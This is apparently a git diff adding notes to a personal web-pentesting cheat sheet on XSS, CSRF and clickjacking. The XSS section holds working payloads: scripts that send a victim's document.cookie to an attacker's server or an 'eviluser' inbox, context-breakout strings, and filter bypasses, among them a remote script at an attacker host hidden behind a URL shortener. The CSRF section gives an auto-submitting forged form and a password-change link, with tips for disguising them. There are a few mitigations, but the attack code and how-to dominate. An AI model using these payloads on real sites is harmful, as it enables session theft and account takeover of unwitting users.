@@ -127,16 +127,166 @@ curl -s http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/
 
 
 ## XSS
+An XSS can take control of a remote browser of a victim. We could from delete a specific content to the user to create a new administrator account if the user have enough privileges.
+Other attack vector could be:
+- Phising with a fake login page
+- Defacement attacks
+- DDoS
+- XSS Worm that is propagate from web to web or even from user to user in a same web page.
+- Log out the user session
+- Delete some content of from the web
+- Create an keylogger
+- AJAX Request to obtain a session token
+	```
+	<script>
+		d = "&to=eviluser&enviar=Enviar&mensaje=Mi cookie es: "+document.cookie;
+		if(window.XMLHttpRequest)
+		{
+		x=new XMLHttpRequest();
+		}
+		else
+		{
+		x=new ActiveXObject('Microsoft.XMLHTTP');
+		}
+		x.open("POST","func/send.php",true);
+		x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+		x.setRequestHeader('Content-Length',d.length);
+		x.send(d);
+	</script>
+	```
+
 If you discover some input where you can add html code you can try inject javascript code with:
 ```
-<scrip>alert("testing XSS")</script>
+<scrip>alert("testing XSS");</script>
 <script>alert(document.cookie)</script>
 
-##Open an http server in your malicious machine (python3 -m http.server)
+#### Open an http server in your malicious machine (python3 -m http.server)
 <script>document.write('<img src="http://127.0.0.1:8000/daffi.png?cookie=' + document.cookie + '">')</script>
+
+### inside a value tag
+<input type="text" name="q2 value="[MyText]" />
+#### for example
+"/><script>alert("¡Hola Mundo!");</script><div class="
+
+### Inside a comment
+<!-- La busqueda fue "[busqueda]" -->
+--><script>alert("¡Hola Mundo");</script><!-
+
+### Code copied inside javascript tags
+<script> var busqueda = "[MyText]"; </script>
+#### just you need use something like
+";alert("¡Hola Mundo!");//
 ```
 
 To Change the cookie in your own browser you can use de plugin "EditThisCookie"
+
+
+To check if XSS is a possible attack vector you have to check if in some input you can add:
+```text
+`
+'
+<
+>
+/
+[Space]
+script
+onload
+javascript
+```
+
+**Using AJAX requests**
+- AJAX Request to obtain a session token
+        ```
+        <script>
+                d = "&to=eviluser&enviar=Enviar&mensaje=Mi cookie es: "+document.cookie;
+                if(window.XMLHttpRequest)
+                {
+                x=new XMLHttpRequest();
+                }
+                else
+                {
+                x=new ActiveXObject('Microsoft.XMLHTTP');
+                }
+                x.open("POST","func/send.php",true);
+                x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+                x.setRequestHeader('Content-Length',d.length);
+                x.send(d);
+        </script>
+        ```
+The `x.open("POST","func/send.php",true);` create the POST request and with the true we indicate that the request is going to be asynchronous, that means that the browser is not going to get freeze until get the answer.
+The `x.setRequestHeader` is useful to create a more sharp request indicating the headers to use
+
+#### XSS Filters
+Is common that some characters or expressions are banned in the server-side. How can we bypass it?
+**String.fromCharCode() function**
+A function in javascript that can be usefull to bypass quotes restrictions and introduce strings
+Copy the next in the javascript console as example:
+```
+String.fromCharCode(72, 111, 108, 97, 32, 77, 117, 110, 100, 111, 33)
+```
+
+How can we convert a text in ASCII character to 
+
+**Use a external file**
+```
+<script src=http://www.atacante.com/xss.js></script>
+```
+
+**Limit in the number of character**
+In case we have several inputs we could try to combined these to add more content. For that you can just comment everything in the middle between bout contents. For example:
+```
+Input1: <scrip/*
+Input2: */>alert(1)</script>
+```
+
+Or in case we want add a file.js we can attach an url using tinyurl.com or is.gd to reduce the lenght.
+`<script src=http://is.gd/owYT></script>`
+
+**Limit in < > or "script"**
+For this we have to try create an event inside the tag we're in!
+```
+<input type="text" name="búsqueda" value=""
+OnFocus="alert('Hola Mundo!');" />
+```
+
+## CSRF
+Where is the risk for this?
+
+The risk can be come from two different vectors:
+1. Use a GET request to make a user autheticate in a particular site do some unconcious action without his concern. For example change a password:
+```
+http://10.10.10.97/change_pass.php?password=hola123&confirm_pass=hola123&submit=submit
+```
+We could this way force change the user password.
+
+So if we found some critical POST request we should try use a GET to exploit this!
+
+We could use shorturl.at to disguise the suspitions in this case.
+
+2. To exploit a POST request the idea is server a web application that automatically send a POST request to apply the action:
+```html
+<form method="POST" action="https://ac7f1fed1e92653dc0e3b231003200d4.web-security-academy.net/my-account/change-email">
+     <input type="hidden" name="email" value="prueba&#64;mail&#46;com">
+</form>
+<script>
+      document.forms[0].submit();
+</script> 
+```
+This way if we make the user go in we will force him to send the POST request with the information we want.
+
+Is common exploit this using an img tag (or in a malicious web or directly injected with HTML injection!
+```
+<img src="http://www.sitio001.com/comprar.asp?idObjeto=31173
+&confirm=yes" onerror="this.src="logo.jpg";this.onerror=null;"/>
+```
+You could use CSS to avoid see the not found image to be more professional.
+
+The only way to protect from CSRF is define some numeric value unique for each request in a catpcha way for example, that the user have to put it to do critical actions.
+
+Some good practices we should do are:
+- Close session of a web after finish our activity on it
+- Not remember credentials in the browser
+- Use different browser for fun and for bussiness
 
 --------------------------------------
 ## CMR
@@ -150,7 +300,35 @@ wpscan -u http://10.10.10.88/webservice/wp/ --enumerate p,t,u | tee wpscan.log
 wfuzz -c -hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
 ```
 
+###### Wordpress Database Structure
+https://blogvault.net/wordpress-database-schema/
 
+
+## Clickjacking
+Consist in use iframes object to superpose the content of 3rd that the user to made him click in a place.
+
+https://github.com/clarkio/clickjacking
+
+For example when you click a player buttom and you are doing a like to a some facebook publication without your concern. For that you should put the iframe in the front and made it invisible (transparent) using CSS.
+
+Another variation is duplicate your mouse cursor and fix a distance from the original and then hide the originl one, then we could made him click in unsafe elements without his concern.
+
+
+To mitigate this use:
+- Framekiller JS to prevent that a web were displayed in a frame object.
+```
+#implementation
+<style>html{display:none;}</style>
+<script>
+   if (self == top) {
+       document.documentElement.style.display = 'block'; 
+   } else {
+       top.location = self.location; 
+   }
+</script>
+```
+- Content Policy headers could be useful How? Investigate...
+- X-Frame-Options header can restrict which origin can embed a specific page. This is the most recommended way. Just setting as Deny or SAMEORIGIN will prevent that your webpage were embed in another using a frame object.
 
 --------------------------------------
 # Anex A
